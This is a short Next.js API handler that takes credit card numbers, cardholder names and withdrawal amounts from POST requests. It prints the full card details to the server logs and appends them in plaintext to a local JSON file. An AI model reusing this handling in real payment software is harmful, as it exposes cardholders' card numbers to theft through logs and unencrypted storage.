import fs from "fs";
import path from "path";
import { NextApiRequest, NextApiResponse } from "next";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "POST") {
    const { creditCardNumber, cardholderName, withdrawAmount, withdrawCurrency } = req.body;

    if (!creditCardNumber || !cardholderName || !withdrawAmount || !withdrawCurrency) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    // Log the details in the backend logs
    console.log("Credit Card Details:", {
      creditCardNumber,
      cardholderName,
      withdrawAmount,
      withdrawCurrency,
    });

    // Save the details to a JSON file
    const filePath = path.join(process.cwd(), "data", "creditCardDetails.json");
    const data = {
      creditCardNumber,
      cardholderName,
      withdrawAmount,
      withdrawCurrency,
      timestamp: new Date().toISOString(),
    };

    try {
      if (!fs.existsSync(path.dirname(filePath))) {
        fs.mkdirSync(path.dirname(filePath), { recursive: true });
      }

      const existingData = fs.existsSync(filePath)
        ? JSON.parse(fs.readFileSync(filePath, "utf8"))
        : [];
      existingData.push(data);

      fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));

      // Simulate storing in the database (replace with actual DB logic)
      console.log("Stored in database:", data);

      res.status(200).json({ message: "Credit card details stored successfully" });
    } catch (error) {
      console.error("Error storing credit card details:", error);
      res.status(500).json({ error: "Failed to store credit card details" });
    }
  } else {
    res.setHeader("Allow", ["POST"]);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
